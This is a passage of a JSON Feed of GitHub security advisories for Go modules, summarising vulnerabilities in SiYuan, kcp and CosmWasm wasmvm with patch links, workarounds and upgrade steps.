{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An arbitrary file read vulnerability exists in Siyuan's /api/template/render endpoint. The absence of proper validation on the path parameter allows attackers to access sensitive files on the host system.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Arbitrary file read on the host</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/siyuan-note/siyuan/security/advisories/GHSA-xx68-37v4-4596\">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-xx68-37v4-4596</a></li>\n<li><a href=\"https://github.com/siyuan-note/siyuan/commit/e70ed57f6e4852e2bd702671aeb8eb3a47a36d71\">https://github.com/siyuan-note/siyuan/commit/e70ed57f6e4852e2bd702671aeb8eb3a47a36d71</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xx68-37v4-4596\">https://github.com/advisories/GHSA-xx68-37v4-4596</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xx68-37v4-4596",
            "title": "[github.com/siyuan-note/siyuan/kernel] SiYuan has an arbitrary file read via /api/template/render",
            "date_modified": "2024-12-11T18:44:54.000Z",
            "date_published": "2024-12-11T18:44:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xx68-37v4-4596"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The /api/asset/upload endpoint in Siyuan is vulnerable to both arbitrary file write to the host and stored XSS (via the file write).</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Arbitrary file write</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/siyuan-note/siyuan/security/advisories/GHSA-fqj6-whhx-47p7\">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-fqj6-whhx-47p7</a></li>\n<li><a href=\"https://github.com/siyuan-note/siyuan/commit/e70ed57f6e4852e2bd702671aeb8eb3a47a36d71\">https://github.com/siyuan-note/siyuan/commit/e70ed57f6e4852e2bd702671aeb8eb3a47a36d71</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fqj6-whhx-47p7\">https://github.com/advisories/GHSA-fqj6-whhx-47p7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fqj6-whhx-47p7",
            "title": "[github.com/siyuan-note/siyuan/kernel] SiYuan has an arbitrary file write in the host via /api/asset/upload",
            "date_modified": "2024-12-11T18:44:54.000Z",
            "date_published": "2024-12-11T18:44:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fqj6-whhx-47p7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Siyuan's /api/export/exportResources endpoint is vulnerable to arbitary file read via path traversal. It is possible to manipulate the paths parameter to access and download arbitrary files from the host system by traversing the workspace directory structure.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Arbitrary File Read</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/siyuan-note/siyuan/security/advisories/GHSA-25w9-wqfq-gwqx\">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-25w9-wqfq-gwqx</a></li>\n<li><a href=\"https://github.com/siyuan-note/siyuan/commit/e70ed57f6e4852e2bd702671aeb8eb3a47a36d71\">https://github.com/siyuan-note/siyuan/commit/e70ed57f6e4852e2bd702671aeb8eb3a47a36d71</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-25w9-wqfq-gwqx\">https://github.com/advisories/GHSA-25w9-wqfq-gwqx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-25w9-wqfq-gwqx",
            "title": "[github.com/siyuan-note/siyuan/kernel] SiYuan has an arbitrary file read and path traversal via /api/export/exportResources",
            "date_modified": "2024-12-11T18:44:54.000Z",
            "date_published": "2024-12-11T18:44:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-25w9-wqfq-gwqx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Siyuan's /api/template/renderSprig endpoint is vulnerable to Server-Side Template Injection (SSTI) through the Sprig template engine. Although the engine has limitations, it allows attackers to access environment variables</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Information leakage</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/siyuan-note/siyuan/security/advisories/GHSA-4pjc-pwgq-q9jp\">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-4pjc-pwgq-q9jp</a></li>\n<li><a href=\"https://github.com/siyuan-note/siyuan/commit/e70ed57f6e4852e2bd702671aeb8eb3a47a36d71\">https://github.com/siyuan-note/siyuan/commit/e70ed57f6e4852e2bd702671aeb8eb3a47a36d71</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4pjc-pwgq-q9jp\">https://github.com/advisories/GHSA-4pjc-pwgq-q9jp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4pjc-pwgq-q9jp",
            "title": "[github.com/siyuan-note/siyuan/kernel] SiYuan has an SSTI via /api/template/renderSprig",
            "date_modified": "2024-12-11T18:44:48.000Z",
            "date_published": "2024-12-11T18:44:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4pjc-pwgq-q9jp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><a href=\"https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation\">Impersonation</a> is a feature of the Kubernetes API, allowing to override user information. As downstream project, kcp inherits this feature. As per the linked documentation a specific level of privilege (usually assigned to cluster admins) is required for impersonation.</p>\n<p>The vulnerability in kcp affects kcp installations in which users are granted the <code>cluster-admin</code> ClusterRole (or comparably high permission levels that grant impersonation access; the verb in question is <code>impersonate</code>) within their respective workspaces. As kcp builds around self-service confined within workspaces, most installations would likely grant such workspace access to their users. Such users can impersonate special global administrative groups, which circumvent parts of the authorizer chains, e.g. <a href=\"https://docs.kcp.io/kcp/v0.26/concepts/apis/exporting-apis/#maximal-permission-policy\">maximal permission policies</a>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The problem has been patched in #3206 and is available in kcp 0.26.1 and higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ul>\n<li>Not assigning the <code>cluster-admin</code> role (or any other role granting blanket impersonation permissions) to users.</li>\n<li>A reverse proxy between users and kcp to check for the <code>Impersonate-Group</code> header and reject requests that impersonate global administrative groups.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<p>See the pull request (#3206).</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/kcp-dev/kcp/security/advisories/GHSA-c7xh-gjv4-4jgv\">https://github.com/kcp-dev/kcp/security/advisories/GHSA-c7xh-gjv4-4jgv</a></li>\n<li><a href=\"https://github.com/kcp-dev/kcp/pull/3206\">https://github.com/kcp-dev/kcp/pull/3206</a></li>\n<li><a href=\"https://github.com/kcp-dev/kcp/commit/24ab5d4dc35ddff98a2e5fdc236e1681f03283ec\">https://github.com/kcp-dev/kcp/commit/24ab5d4dc35ddff98a2e5fdc236e1681f03283ec</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c7xh-gjv4-4jgv\">https://github.com/advisories/GHSA-c7xh-gjv4-4jgv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c7xh-gjv4-4jgv",
            "title": "[github.com/kcp-dev/kcp] kcp's impersonation allows access to global administrative groups",
            "date_modified": "2024-12-11T18:42:34.000Z",
            "date_published": "2024-12-11T18:42:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c7xh-gjv4-4jgv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"cwa-2024-007\">CWA-2024-007</h1>\n<p><strong>Severity</strong></p>\n<p>Medium (Moderate + Likely)[^1]</p>\n<p><strong>Affected versions:</strong></p>\n<ul>\n<li>wasmvm &gt;= 2.1.0, &lt; 2.1.3</li>\n<li>wasmvm &gt;= 2.0.0, &lt; 2.0.4</li>\n<li>wasmvm &lt; 1.5.5</li>\n<li>cosmwasm-vm &gt;= 2.1.0, &lt; 2.1.4</li>\n<li>cosmwasm-vm &gt;= 2.0.0, &lt; 2.0.7</li>\n<li>cosmwasm-vm &lt; 1.5.8</li>\n</ul>\n<p><strong>Patched versions:</strong></p>\n<ul>\n<li>wasmvm 1.5.5, 2.0.4, 2.1.3</li>\n<li>cosmwasm-vm 1.5.8, 2.0.7, 2.1.4</li>\n</ul>\n<h2 id=\"description-of-the-bug\">Description of the bug</h2>\n<p>(Blank for now. We'll add more detail once chains had a chance to upgrade.)</p>\n<h2 id=\"patch\">Patch</h2>\n<ul>\n<li>1.5: <a href=\"https://github.com/CosmWasm/cosmwasm/commit/16eabd681790508b13dac8e67f9e6e61045240ea\">https://github.com/CosmWasm/cosmwasm/commit/16eabd681790508b13dac8e67f9e6e61045240ea</a></li>\n<li>2.0: <a href=\"https://github.com/CosmWasm/cosmwasm/commit/0e70bd83119b02f99a2c0397f0913e0803750fd9\">https://github.com/CosmWasm/cosmwasm/commit/0e70bd83119b02f99a2c0397f0913e0803750fd9</a></li>\n<li>2.1: <a href=\"https://github.com/CosmWasm/cosmwasm/commit/f5bf24f3acadca2892afd58cc3ce5fdeb932d492\">https://github.com/CosmWasm/cosmwasm/commit/f5bf24f3acadca2892afd58cc3ce5fdeb932d492</a></li>\n</ul>\n<h2 id=\"applying-the-patch\">Applying the patch</h2>\n<p>The patch will be shipped in releases of wasmvm. You can update more or less as follows:</p>\n<ol>\n<li>Check the current wasmvm version: <code>go list -m github.com/CosmWasm/wasmvm</code></li>\n<li>Bump the <code>github.com/CosmWasm/wasmvm</code> dependency in your go.mod to 1.5.5, 2.0.4, 2.1.3 depending on which minor version you are; <code>go mod tidy</code>; commit.</li>\n<li>If you use the static libraries <code>libwasmvm_muslc.aarch64.a</code>/<code>libwasmvm_muslc.x86_64.a</code>, update them accordingly.</li>\n<li>Check the updated wasmvm version: <code>go list -m github.com/CosmWasm/wasmvm</code> and ensure you see 1.5.5, 2.0.4, 2.1.3.</li>\n<li>Follow your regular practices to deploy chain upgrades.</li>\n</ol>\n<p>To double check if the correct library version is loaded at runtime, use this query:\n<code>&lt;appd&gt; query wasm libwasmvm-version</code>. It must show 1.5.5, 2.0.4 or 2.1.3.</p>\n<p>The patch is consensus breaking and requires a coordinated upgrade.</p>\n<h2 id=\"acknowledgement\">Acknowledgement</h2>\n<p>This issue was found by meadow101 who reported it to the Cosmos Bug Bounty Program on HackerOne.</p>\n<p>If you believe you have found a bug in the Interchain Stack or would like to contribute to the\nprogram by reporting a bug, please see <a href=\"https://hackerone.com/cosmos\">https://hackerone.com/cosmos</a>.</p>\n<h2 id=\"timeline\">Timeline</h2>\n<ul>\n<li>2024-08-28: Confio receives a report through the Cosmos bug bounty program maintained by Amulet.</li>\n<li>2024-08-30: Confio security contributors confirm the report.</li>\n<li>2024-09-02: Confio developed the patch internally.</li>\n<li>2024-09-23: Patch is released.</li>\n</ul>\n<p>[^1]: following Amulet's Severity Classification Framework ACMv1: <a href=\"https://github.com/interchainio/security/blob/e0227a1fb4059144aab4f6003eeee7f09912db3a/resources/CLASSIFICATION_MATRIX.md\">https://github.com/interchainio/security/blob/e0227a1fb4059144aab4f6003eeee7f09912db3a/resources/CLASSIFICATION_MATRIX.md</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-2q97-m5rc-p3gp\">https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-2q97-m5rc-p3gp</a></li>\n<li><a href=\"https://github.com/CosmWasm/cosmwasm/commit/0e70bd83119b02f99a2c0397f0913e0803750fd9\">https://github.com/CosmWasm/cosmwasm/commit/0e70bd83119b02f99a2c0397f0913e0803750fd9</a></li>\n<li><a href=\"https://github.com/CosmWasm/cosmwasm/commit/16eabd681790508b13dac8e67f9e6e61045240ea\">https://github.com/CosmWasm/cosmwasm/commit/16eabd681790508b13dac8e67f9e6e61045240ea</a></li>\n<li><a href=\"https://github.com/CosmWasm/cosmwasm/commit/f5bf24f3acadca2892afd58cc3ce5fdeb932d492\">https://github.com/CosmWasm/cosmwasm/commit/f5bf24f3acadca2892afd58cc3ce5fdeb932d492</a></li>\n<li><a href=\"https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-007.md\">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-007.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2q97-m5rc-p3gp\">https://github.com/advisories/GHSA-2q97-m5rc-p3gp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2q97-m5rc-p3gp",
            "title": "[github.com/CosmWasm/wasmvm] CosmWasm VM Incorrect metering",
            "date_modified": "2024-12-10T16:55:41.000Z",
            "date_published": "2024-12-10T16:55:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2q97-m5rc-p3gp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"cwa-2024-007\">CWA-2024-007</h1>\n<p><strong>Severity</strong></p>\n<p>Medium (Moderate + Likely)[^1]</p>\n<p><strong>Affected versions:</strong></p>\n<ul>\n<li>wasmvm &gt;= 2.1.0, &lt; 2.1.3</li>\n<li>wasmvm &gt;= 2.0.0, &lt; 2.0.4</li>\n<li>wasmvm &lt; 1.5.5</li>\n<li>cosmwasm-vm &gt;= 2.1.0, &lt; 2.1.4</li>\n<li>cosmwasm-vm &gt;= 2.0.0, &lt; 2.0.7</li>\n<li>cosmwasm-vm &lt; 1.5.8</li>\n</ul>\n<p><strong>Patched versions:</strong></p>\n<ul>\n<li>wasmvm 1.5.5, 2.0.4, 2.1.3</li>\n<li>cosmwasm-vm 1.5.8, 2.0.7, 2.1.4</li>\n</ul>\n<h2 id=\"description-of-the-bug\">Description of the bug</h2>\n<p>(Blank for now. We'll add more detail once chains had a chance to upgrade.)</p>\n<h2 id=\"patch\">Patch</h2>\n<ul>\n<li>1.5: <a href=\"https://github.com/CosmWasm/cosmwasm/commit/16eabd681790508b13dac8e67f9e6e61045240ea\">https://github.com/CosmWasm/cosmwasm/commit/16eabd681790508b13dac8e67f9e6e61045240ea</a></li>\n<li>2.0: <a href=\"https://github.com/CosmWasm/cosmwasm/commit/0e70bd83119b02f99a2c0397f0913e0803750fd9\">https://github.com/CosmWasm/cosmwasm/commit/0e70bd83119b02f99a2c0397f0913e0803750fd9</a></li>\n<li>2.1: <a href=\"https://github.com/CosmWasm/cosmwasm/commit/f5bf24f3acadca2892afd58cc3ce5fdeb932d492\">https://github.com/CosmWasm/cosmwasm/commit/f5bf24f3acadca2892afd58cc3ce5fdeb932d492</a></li>\n</ul>\n<h2 id=\"applying-the-patch\">Applying the patch</h2>\n<p>The patch will be shipped in releases of wasmvm. You can update more or less as follows:</p>\n<ol>\n<li>Check the current wasmvm version: <code>go list -m github.com/CosmWasm/wasmvm</code></li>\n<li>Bump the <code>github.com/CosmWasm/wasmvm</code> dependency in your go.mod to 1.5.5, 2.0.4, 2.1.3 depending on which minor version you are; <code>go mod tidy</code>; commit.</li>\n<li>If you use the static libraries <code>libwasmvm_muslc.aarch64.a</code>/<code>libwasmvm_muslc.x86_64.a</code>, update them accordingly.</li>\n<li>Check the updated wasmvm version: <code>go list -m github.com/CosmWasm/wasmvm</code> and ensure you see 1.5.5, 2.0.4, 2.1.3.</li>\n<li>Follow your regular practices to deploy chain upgrades.</li>\n</ol>\n<p>To double check if the correct library version is loaded at runtime, use this query:\n<code>&lt;appd&gt; query wasm libwasmvm-version</code>. It must show 1.5.5, 2.0.4 or 2.1.3.</p>\n<p>The patch is consensus breaking and requires a coordinated upgrade.</p>\n<h2 id=\"acknowledgement\">Acknowledgement</h2>\n<p>This issue was found by meadow101 who reported it to the Cosmos Bug Bounty Program on HackerOne.</p>\n<p>If you believe you have found a bug in the Interchain Stack or would like to contribute to the\nprogram by reporting a bug, please see <a href=\"https://hackerone.com/cosmos\">https://hackerone.com/cosmos</a>.</p>\n<h2 id=\"timeline\">Timeline</h2>\n<ul>\n<li>2024-08-28: Confio receives a report through the Cosmos bug bounty program maintained by Amulet.</li>\n<li>2024-08-30: Confio security contributors confirm the report.</li>\n<li>2024-09-02: Confio developed the patch internally.</li>\n<li>2024-09-23: Patch is released.</li>\n</ul>\n<p>[^1]: following Amulet's Severity Classification Framework ACMv1: <a href=\"https://github.com/interchainio/security/blob/e0227a1fb4059144aab4f6003eeee7f09912db3a/resources/CLASSIFICATION_MATRIX.md\">https://github.com/interchainio/security/blob/e0227a1fb4059144aab4f6003eeee7f09912db3a/resources/CLASSIFICATION_MATRIX.md</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-2q97-m5rc-p3gp\">https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-2q97-m5rc-p3gp</a></li>\n<li><a href=\"https://github.com/CosmWasm/cosmwasm/commit/0e70bd83119b02f99a2c0397f0913e0803750fd9\">https://github.com/CosmWasm/cosmwasm/commit/0e70bd83119b02f99a2c0397f0913e0803750fd9</a></li>\n<li><a href=\"https://github.com/CosmWasm/cosmwasm/commit/16eabd681790508b13dac8e67f9e6e61045240ea\">https://github.com/CosmWasm/cosmwasm/commit/16eabd681790508b13dac8e67f9e6e61045240ea</a></li>\n<li><a href=\"https://github.com/CosmWasm/cosmwasm/commit/f5bf24f3acadca2892afd58cc3ce5fdeb932d492\">https://github.com/CosmWasm/cosmwasm/commit/f5bf24f3acadca2892afd58cc3ce5fdeb932d492</a></li>\n<li><a href=\"https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-007.md\">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-007.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2q97-m5rc-p3gp\">https://github.com/advisories/GHSA-2q97-m5rc-p3gp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2q97-m5rc-p3gp",
            "title": "[github.com/CosmWasm/wasmvm/v2] CosmWasm VM Incorrect metering",
            "date_modified": "2024-12-10T16:55:41.000Z",
            "date_published": "2024-12-10T16:55:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2q97-m5rc-p3gp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"cwa-2024-007\">CWA-2024-007</h1>\n<p><strong>Severity</strong></p>\n<p>Medium (Moderate + Likely)[^1]</p>\n<p><strong>Affected versions:</strong></p>\n<ul>\n<li>wasmvm &gt;= 2.1.0, &lt; 2.1.3</li>\n<li>wasmvm &gt;= 2.0.0, &lt; 2.0.4</li>\n<li>wasmvm &lt; 1.5.5</li>\n<li>cosmwasm-vm &gt;= 2.1.0, &lt; 2.1.4</li>\n<li>cosmwasm-vm &gt;= 2.0.0, &lt; 2.0.7</li>\n<li>cosmwasm-vm &lt; 1.5.8</li>\n</ul>\n<p><strong>Patched versions:</strong></p>\n<ul>\n<li>wasmvm 1.5.5, 2.0.4, 2.1.3</li>\n<li>cosmwasm-vm 1.5.8, 2.0.7, 2.1.4</li>\n</ul>\n<h2 id=\"description-of-the-bug\">Description of the bug</h2>\n<p>(Blank for now. We'll add more detail once chains had a chance to upgrade.)</p>\n<h2 id=\"patch\">Patch</h2>\n<ul>\n<li>1.5: <a href=\"https://github.com/CosmWasm/cosmwasm/commit/16eabd681790508b13dac8e67f9e6e61045240ea\">https://github.com/CosmWasm/cosmwasm/commit/16eabd681790508b13dac8e67f9e6e61045240ea</a></li>\n<li>2.0: <a href=\"https://github.com/CosmWasm/cosmwasm/commit/0e70bd83119b02f99a2c0397f0913e0803750fd9\">https://github.com/CosmWasm/cosmwasm/commit/0e70bd83119b02f99a2c0397f0913e0803750fd9</a></li>\n<li>2.1: <a href=\"https://github.com/CosmWasm/cosmwasm/commit/f5bf24f3acadca2892afd58cc3ce5fdeb932d492\">https://github.com/CosmWasm/cosmwasm/commit/f5bf24f3acadca2892afd58cc3ce5fdeb932d492</a></li>\n</ul>\n<h2 id=\"applying-the-patch\">Applying the patch</h2>\n<p>The patch will be shipped in releases of wasmvm. You can update more or less as follows:</p>\n<ol>\n<li>Check the current wasmvm version: <code>go list -m github.com/CosmWasm/wasmvm</code></li>\n<li>Bump the <code>github.com/CosmWasm/wasmvm</code> dependency in your go.mod to 1.5.5, 2.0.4, 2.1.3 depending on which minor version you are; <code>go mod tidy</code>; commit.</li>\n<li>If you use the static libraries <code>libwasmvm_muslc.aarch64.a</code>/<code>libwasmvm_muslc.x86_64.a</code>, update them accordingly.</li>\n<li>Check the updated wasmvm version: <code>go list -m github.com/CosmWasm/wasmvm</code> and ensure you see 1.5.5, 2.0.4, 2.1.3.</li>\n<li>Follow your regular practices to deploy chain upgrades.</li>\n</ol>\n<p>To double check if the correct library version is loaded at runtime, use this query:\n<code>&lt;appd&gt; query wasm libwasmvm-version</code>. It must show 1.5.5, 2.0.4 or 2.1.3.</p>\n<p>The patch is consensus breaking and requires a coordinated upgrade.</p>\n<h2 id=\"acknowledgement\">Acknowledgement</h2>\n<p>This issue was found by meadow101 who reported it to the Cosmos Bug Bounty Program on HackerOne.</p>\n<p>If you believe you have found a bug in the Interchain Stack or would like to contribute to the\nprogram by reporting a bug, please see <a href=\"https://hackerone.com/cosmos\">https://hackerone.com/cosmos</a>.</p>\n<h2 id=\"timeline\">Timeline</h2>\n<ul>\n<li>2024-08-28: Confio receives a report through the Cosmos bug bounty program maintained by Amulet.</li>\n<li>2024-08-30: Confio security contributors confirm the report.</li>\n<li>2024-09-02: Confio developed the patch internally.</li>\n<li>2024-09-23: Patch is released.</li>\n</ul>\n<p>[^1]: following Amulet's Severity Classification Framework ACMv1: <a href=\"https://github.com/interchainio/security/blob/e0227a1fb4059144aab4f6003eeee7f09912db3a/resources/CLASSIFICATION_MATRIX.md\">https://github.com/interchainio/security/blob/e0227a1fb4059144aab4f6003eeee7f09912db3a/resources/CLASSIFICATION_MATRIX.md</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-2q97-m5rc-p3gp\">https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-2q97-m5rc-p3gp</a></li>\n<li><a href=\"https://github.com/CosmWasm/cosmwasm/commit/0e70bd83119b02f99a2c0397f0913e0803750fd9\">https://github.com/CosmWasm/cosmwasm/commit/0e70bd83119b02f99a2c0397f0913e0803750fd9</a></li>\n<li><a href=\"https://github.com/CosmWasm/cosmwasm/commit/16eabd681790508b13dac8e67f9e6e61045240ea\">https://github.com/CosmWasm/cosmwasm/commit/16eabd681790508b13dac8e67f9e6e61045240ea</a></li>\n<li><a href=\"https://github.com/CosmWasm/cosmwasm/commit/f5bf24f3acadca2892afd58cc3ce5fdeb932d492\">https://github.com/CosmWasm/cosmwasm/commit/f5bf24f3acadca2892afd58cc3ce5fdeb932d492</a></li>\n<li><a href=\"https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-007.md\">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-007.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2q97-m5rc-p3gp\">https://github.com/advisories/GHSA-2q97-m5rc-p3gp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2q97-m5rc-p3gp",
            "title": "[github.com/CosmWasm/wasmvm/v2] CosmWasm VM Incorrect metering",
            "date_modified": "2024-12-10T16:55:41.000Z",
            "date_published": "2024-12-10T16:55:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2q97-m5rc-p3gp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"cwa-2024-008\">CWA-2024-008</h1>\n<p><strong>Severity</strong></p>\n<p>Medium (Moderate + Likely)[^1]</p>\n<p><strong>Affected versions:</strong></p>\n<ul>\n<li>wasmvm &gt;= 2.1.0, &lt; 2.1.3</li>\n<li>wasmvm &gt;= 2.0.0, &lt; 2.0.4</li>\n<li>wasmvm &lt; 1.5.5</li>\n<li>cosmwasm-vm &gt;= 2.1.0, &lt; 2.1.4</li>\n<li>cosmwasm-vm &gt;= 2.0.0, &lt; 2.0.7</li>\n<li>cosmwasm-vm &lt; 1.5.8</li>\n</ul>\n<p><strong>Patched versions:</strong></p>\n<ul>\n<li>wasmvm 1.5.5, 2.0.4, 2.1.3</li>\n<li>cosmwasm-vm 1.5.8, 2.0.7, 2.1.4</li>\n</ul>\n<h2 id=\"description-of-the-bug\">Description of the bug</h2>\n<p>(Blank for now. We'll add more detail once chains had a chance to upgrade.)</p>\n<h2 id=\"patch\">Patch</h2>\n<ul>\n<li>1.5: <a href=\"https://github.com/CosmWasm/cosmwasm/commit/edcdbc520d4f5521eed42de6e2869658278e91fd\">https://github.com/CosmWasm/cosmwasm/commit/edcdbc520d4f5521eed42de6e2869658278e91fd</a></li>\n<li>2.0: <a href=\"https://github.com/CosmWasm/cosmwasm/commit/f63429ca59eb44dd5d780c1572016581337091e4\">https://github.com/CosmWasm/cosmwasm/commit/f63429ca59eb44dd5d780c1572016581337091e4</a></li>\n<li>2.1: <a href=\"https://github.com/CosmWasm/cosmwasm/commit/108e7dcbf9c21df0fa83f355ad3a7355d7f220cb\">https://github.com/CosmWasm/cosmwasm/commit/108e7dcbf9c21df0fa83f355ad3a7355d7f220cb</a></li>\n</ul>\n<h2 id=\"applying-the-patch\">Applying the patch</h2>\n<p>The patch will be shipped in releases of wasmvm. You can update more or less as follows:</p>\n<ol>\n<li>Check the current wasmvm version: <code>go list -m github.com/CosmWasm/wasmvm</code></li>\n<li>Bump the <code>github.com/CosmWasm/wasmvm</code> dependency in your go.mod to 1.5.5, 2.0.4, 2.1.3 depending on which minor version you are; <code>go mod tidy</code>; commit.</li>\n<li>If you use the static libraries <code>libwasmvm_muslc.aarch64.a</code>/<code>libwasmvm_muslc.x86_64.a</code>, update them accordingly.</li>\n<li>Check the updated wasmvm version: <code>go list -m github.com/CosmWasm/wasmvm</code> and ensure you see 1.5.5, 2.0.4, 2.1.3.</li>\n<li>Follow your regular practices to deploy chain upgrades.</li>\n</ol>\n<p>To double check if the correct library version is loaded at runtime, use this query:\n<code>&lt;appd&gt; query wasm libwasmvm-version</code>. It must show 1.5.5, 2.0.4 or 2.1.3.</p>\n<p>The patch is consensus breaking and requires a coordinated upgrade.</p>\n<h2 id=\"acknowledgement\">Acknowledgement</h2>\n<p>This issue was found by meadow101 who reported it to the Cosmos Bug Bounty Program on HackerOne.</p>\n<p>If you believe you have found a bug in the Interchain Stack or would like to contribute to the\nprogram by reporting a bug, please see <a href=\"https://hackerone.com/cosmos\">https://hackerone.com/cosmos</a>.</p>\n<h2 id=\"timeline\">Timeline</h2>\n<ul>\n<li>2024-08-22: Confio receives a report through the Cosmos bug bounty program maintained by Amulet.</li>\n<li>2024-08-23: Confio security contributors confirm the report.</li>\n<li>2024-09-09: Confio developed the patch internally.</li>\n<li>2024-09-23: Patch is released.</li>\n</ul>\n<p>[^1]: following Amulet's Severity Classification Framework ACMv1: <a href=\"https://github.com/interchainio/security/blob/e0227a1fb4059144aab4f6003eeee7f09912db3a/resources/CLASSIFICATION_MATRIX.md\">https://github.com/interchainio/security/blob/e0227a1fb4059144aab4f6003eeee7f09912db3a/resources/CLASSIFICATION_MATRIX.md</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-vmqh-5232-v43r\">https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-vmqh-5232-v43r</a></li>\n<li><a href=\"https://github.com/CosmWasm/cosmwasm/commit/108e7dcbf9c21df0fa83f355ad3a7355d7f220cb\">https://github.com/CosmWasm/cosmwasm/commit/108e7dcbf9c21df0fa83f355ad3a7355d7f220cb</a></li>\n<li><a href=\"https://github.com/CosmWasm/cosmwasm/commit/edcdbc520d4f5521eed42de6e2869658278e91fd\">https://github.com/CosmWasm/cosmwasm/commit/edcdbc520d4f5521eed42de6e2869658278e91fd</a></li>\n<li><a href=\"https://github.com/CosmWasm/cosmwasm/commit/f63429ca59eb44dd5d780c1572016581337091e4\">https://github.com/CosmWasm/cosmwasm/commit/f63429ca59eb44dd5d780c1572016581337091e4</a></li>\n<li><a href=\"https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-008.md\">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-008.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vmqh-5232-v43r\">https://github.com/advisories/GHSA-vmqh-5232-v43r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vmqh-5232-v43r",
            "title": "[github.com/CosmWasm/wasmvm] Panic in wasmvm can slow down block production",
            "date_modified": "2024-12-10T16:55:38.000Z",
            "date_published": "2024-12-10T16:55:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vmqh-5232-v43r"
            },
            "tags": [
                "severity"
            ]
        },
        {
